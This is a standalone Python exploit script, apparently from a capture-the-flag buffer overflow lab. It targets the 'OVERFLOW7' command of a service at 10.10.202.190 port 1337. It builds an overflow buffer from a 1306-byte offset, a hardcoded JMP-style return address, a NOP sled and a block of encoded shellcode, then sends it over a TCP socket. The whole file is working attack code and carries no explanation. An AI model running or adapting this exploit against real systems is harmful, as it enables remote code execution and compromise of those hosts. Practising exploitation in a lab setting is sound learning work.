#!/usr/bin/env python3

import socket

ip = "10.10.202.190"
port = 1337

prefix = "OVERFLOW7 "
offset = 1306
overflow = "A" * offset
# 625011AF
retn = "\xAF\x11\x50\x62"
padding = "\x90" * 16
payload = ("\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x46\xce\x46\xeb\x83\xee\xfc\xe2\xf4\xba\x26\xc4\xeb\x46\xce"
"\x26\x62\xa3\xff\x86\x8f\xcd\x9e\x76\x60\x14\xc2\xcd\xb9\x52"
"\x45\x34\xc3\x49\x79\x0c\xcd\x77\x31\xea\xd7\x27\xb2\x44\xc7"
"\x66\x0f\x89\xe6\x47\x09\xa4\x19\x14\x99\xcd\xb9\x56\x45\x0c"
"\xd7\xcd\x82\x57\x93\xa5\x86\x47\x3a\x17\x45\x1f\xcb\x47\x1d"
"\xcd\xa2\x5e\x2d\x7c\xa2\xcd\xfa\xcd\xea\x90\xff\xb9\x47\x87"
"\x01\x4b\xea\x81\xf6\xa6\x9e\xb0\xcd\x3b\x13\x7d\xb3\x62\x9e"
"\xa2\x96\xcd\xb3\x62\xcf\x95\x8d\xcd\xc2\x0d\x60\x1e\xd2\x47"
"\x38\xcd\xca\xcd\xea\x96\x47\x02\xcf\x62\x95\x1d\x8a\x1f\x94"
"\x17\x14\xa6\x91\x19\xb1\xcd\xdc\xad\x66\x1b\xa6\x75\xd9\x46"
"\xce\x2e\x9c\x35\xfc\x19\xbf\x2e\x82\x31\xcd\x41\x31\x93\x53"
"\xd6\xcf\x46\xeb\x6f\x0a\x12\xbb\x2e\xe7\xc6\x80\x46\x31\x93"
"\xbb\x16\x9e\x16\xab\x16\x8e\x16\x83\xac\xc1\x99\x0b\xb9\x1b"
"\xd1\x81\x43\xa6\x4c\xe6\x5f\x3c\x2e\xe9\x46\xdf\x1a\x62\xa0"
"\xa4\x56\xbd\x11\xa6\xdf\x4e\x32\xaf\xb9\x3e\xc3\x0e\x32\xe7"
"\xb9\x80\x4e\x9e\xaa\xa6\xb6\x5e\xe4\x98\xb9\x3e\x2e\xad\x2b"
"\x8f\x46\x47\xa5\xbc\x11\x99\x77\x1d\x2c\xdc\x1f\xbd\xa4\x33"
"\x20\x2c\x02\xea\x7a\xea\x47\x43\x02\xcf\x56\x08\x46\xaf\x12"
"\x9e\x10\xbd\x10\x88\x10\xa5\x10\x98\x15\xbd\x2e\xb7\x8a\xd4"
"\xc0\x31\x93\x62\xa6\x80\x10\xad\xb9\xfe\x2e\xe3\xc1\xd3\x26"
"\x14\x93\x75\xa6\xf6\x6c\xc4\x2e\x4d\xd3\x73\xdb\x14\x93\xf2"
"\x40\x97\x4c\x4e\xbd\x0b\x33\xcb\xfd\xac\x55\xbc\x29\x81\x46"
"\x9d\xb9\x3e")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")